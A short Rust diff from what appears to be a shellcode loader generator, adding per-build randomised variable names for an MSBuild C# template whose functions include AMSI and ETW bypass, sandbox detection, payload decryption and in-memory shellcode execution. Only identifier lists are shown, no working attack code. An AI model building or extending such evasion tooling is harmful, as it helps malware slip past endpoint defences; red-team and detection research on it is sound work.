@@ -350,6 +350,38 @@ fn build_context(config: &LoaderConfig) -> Context {
     ] {
         vars.insert(k, rand_ident(7));
     }
+    // MSBuild (C#) local variable names — randomised per build
+    for k in &[
+        // B()/N() helper function names
+        "mb_fn_b", "mb_fn_n",
+        // B() body locals
+        "mb_lv_b_sb", "mb_lv_b_x",
+        // N() body locals
+        "mb_lv_n_b", "mb_lv_n_i",
+        // fn_getexport locals
+        "mb_lv_ge_peo", "mb_lv_ge_exprva", "mb_lv_ge_ed", "mb_lv_ge_nn",
+        "mb_lv_ge_nrva", "mb_lv_ge_orva", "mb_lv_ge_frva", "mb_lv_ge_i",
+        "mb_lv_ge_np", "mb_lv_ge_ok", "mb_lv_ge_j", "mb_lv_ge_ord",
+        // fn_amsi locals
+        "mb_lv_am_t", "mb_lv_am_f",
+        // fn_etw locals
+        "mb_lv_ew_tgt", "mb_lv_ew_fn", "mb_lv_ew_protn", "mb_lv_ew_protaddr",
+        "mb_lv_ew_ntprot", "mb_lv_ew_ph", "mb_lv_ew_ba", "mb_lv_ew_sz",
+        "mb_lv_ew_old", "mb_lv_ew_ba2", "mb_lv_ew_sz2",
+        // fn_sandbox locals
+        "mb_lv_sb_u", "mb_lv_sb_badu", "mb_lv_sb_b", "mb_lv_sb_di", "mb_lv_sb_cn",
+        // fn_decrypt locals
+        "mb_lv_dc_o", "mb_lv_dc_i",
+        // fn_hex locals
+        "mb_lv_hx_b", "mb_lv_hx_i",
+        // Execute() locals
+        "mb_lv_ex_ntdll", "mb_lv_ex_m", "mb_lv_ex_k", "mb_lv_ex_ki",
+        "mb_lv_ex_sc", "mb_lv_ex_allocn", "mb_lv_ex_protn", "mb_lv_ex_allocaddr",
+        "mb_lv_ex_protaddr", "mb_lv_ex_ph", "mb_lv_ex_mem", "mb_lv_ex_rsz",
+        "mb_lv_ex_psz", "mb_lv_ex_oldprot", "mb_lv_ex_fnthread", "mb_lv_ex_fn",
+    ] {
+        vars.insert(k, rand_ident(8));
+    }
 
     // JScript charcode arrays (comma-separated integers) for sensitive strings
     let jsc_pairs: &[(&str, &str)] = &[
